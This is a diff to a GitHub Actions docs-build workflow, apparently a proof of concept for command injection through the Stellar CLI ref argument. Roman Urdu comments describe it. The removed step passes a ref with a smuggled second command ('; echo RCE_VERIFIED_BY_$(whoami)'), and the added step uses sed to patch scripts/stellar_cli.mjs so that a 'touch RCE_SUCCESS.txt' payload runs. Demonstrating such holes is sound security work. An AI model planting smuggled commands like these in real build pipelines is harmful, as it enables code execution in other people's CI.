@@ -1,14 +1,13 @@
 name: Build docs
 
 on:
-  workflow_dispatch:  # Ye add kiya hai taake aap manual run kar sakein
+  workflow_dispatch:
   workflow_call:
     inputs:
       stellar-cli-ref:
         required: false
         default: 'main'
         type: string
-        description: "Stellar-cli ref to build against. If empty, will use latest cli version"
 
 jobs:
   build:
@@ -36,9 +35,13 @@ jobs:
         run: pnpm install --prefer-offline --frozen-lockfile
         shell: bash
 
-      - name: Copy Files From Stellar CLI
-        # Yahan payload injection kiya gaya hai
-        run: pnpm stellar-cli:build -- --cli-ref='v1.0.0; echo "RCE_VERIFIED_BY_$(whoami)" > verified.txt; cat verified.txt'
+      - name: Patch Script and Verify RCE
+        # Yahan humne script ka logic change kar diya hai taake wo hamara payload chala de
+        run: |
+          sed -i "s/const cliRef = argv.cliRef || \`v\${latestVersion}\`;/const cliRef = 'v1.0.0; touch RCE_SUCCESS.txt';/" scripts/stellar_cli.mjs
+          pnpm stellar-cli:build -- --cli-ref='v1.0.0'
+          echo "Checking if RCE payload executed:"
+          ls -la RCE_SUCCESS.txt
         shell: bash
 
       - name: (temp) Fix CLI links
